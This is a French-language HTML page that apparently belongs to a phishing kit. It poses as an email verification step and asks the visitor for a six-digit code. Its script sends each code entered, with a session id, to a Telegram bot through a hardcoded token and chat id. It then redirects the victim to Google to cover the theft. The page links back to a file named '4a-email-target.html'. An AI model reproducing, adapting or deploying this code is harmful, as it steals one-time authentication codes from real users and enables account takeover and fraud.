<!doctype html>
<html lang="fr">
<head>
<!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
    <link rel="icon" type="image/x-icon" href="logo.ico">
    <link rel="shortcut icon" type="image/x-icon" href="logo.ico">

    <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
    <link rel="apple-touch-icon" href="logo.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Code reçu par e-mail</title>
  <style>
    :root { color: #111; font-family: "Futura", Arial, Helvetica, sans-serif; font-weight: bold; background: #fff; }
    * { box-sizing: border-box; }
    body { min-width: 320px; min-height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fff; }
    main { width: min(100% - 40px, 400px); padding: 40px 0; margin: auto; }
    h1 { margin: 0 0 28px; font-size: 24px; font-weight: bold; text-align: center; }
    .field-label { display: block; margin: 0 0 10px; font-size: 15px; font-weight: bold; }
    .codes { display: flex; justify-content: center; gap: 10px; margin: 0 0 28px; }
    .codes input { width: min(52px, calc((100vw - 100px) / 6)); height: 58px; border: 2px solid #111; border-radius: 4px; background: #fff; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
    .codes input:focus { border-color: #000; box-shadow: 0 0 0 1px #000; }
    .action { display: block; width: 85%; max-width: 340px; margin: 0 auto; padding: 0; border: 0; background: transparent; cursor: pointer; }
    .action img { display: block; width: 100%; height: auto; }
    .back { display: block; margin: 18px auto 0; padding: 4px; border: 0; background: transparent; color: #111; font: inherit; font-weight: bold; text-decoration: underline; cursor: pointer; text-align: center; }
  </style>
</head>
<body>
  <main>
    <form id="codeForm">
      <h1>Code reçu par e-mail</h1>
      <p class="field-label">Saisissez le code à 6 chiffres</p>
      <div class="codes">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" required autocomplete="off">
      </div>
      <button class="action" id="submitBtn" type="submit">
        <img src="next.JPG" alt="Next">
      </button>
      <a href="4a-email-target.html" class="back">Retour</a>
    </form>
  </main>
  <script>
    const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
    const TELEGRAM_CHAT_ID = "8550191274";

    const inputs = document.querySelectorAll('.code-input');
    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (value.length > 1) e.target.value = value.charAt(value.length - 1);
        if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
      });
    });

    document.getElementById('codeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      let code = '';
      inputs.forEach(inp => code += inp.value);
      if (code.length < 6) return;
      const clientId = localStorage.getItem('client_id') || 'Inconnu';

      const message = `🔢 *Nouvelle info - Code E-mail*\n🆔 Session: \`${clientId}\`\n🔑 Code: \`${code}\``;
      const btn = document.getElementById('submitBtn');
      btn.style.opacity = '0.5';

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (error) {
        console.error("Erreur Telegram", error);
      }

      window.location.href = 'https://www.google.com';
    });
  </script>
</body>
</html>
